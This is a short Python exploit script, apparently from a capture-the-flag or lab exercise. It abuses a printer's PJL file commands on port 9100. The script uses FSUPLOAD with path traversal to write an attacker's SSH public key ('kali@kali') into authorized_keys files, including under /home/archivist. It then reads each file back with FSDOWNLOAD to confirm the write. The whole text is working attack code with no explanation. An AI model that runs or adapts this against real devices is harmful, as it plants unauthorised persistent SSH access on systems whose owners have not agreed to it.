#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
n = len(KEY)


def upload(path: str) -> None:
    hdr = f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={n}\r\n'.encode()
    s = socket.socket()
    s.settimeout(5)
    s.connect(("127.0.0.1", 9100))
    s.sendall(hdr + KEY)
    try:
        print("up", path, repr(s.recv(512)))
    except socket.timeout:
        print("up", path, "TIMEOUT")
    s.close()


def download(path: str) -> None:
    s = socket.socket()
    s.settimeout(8)
    s.connect(("127.0.0.1", 9100))
    s.sendall(f'@PJL FSDOWNLOAD NAME="{path}"\r\n'.encode())
    buf = b""
    try:
        while True:
            b = s.recv(8192)
            if not b:
                break
            buf += b
    except socket.timeout:
        pass
    s.close()
    print("dl", path, "len", len(buf), buf[:200])


for p in (
    "../.ssh/authorized_keys",
    "/home/archivist/.ssh/authorized_keys",
    "authorized_keys",
):
    upload(p)
    download(p)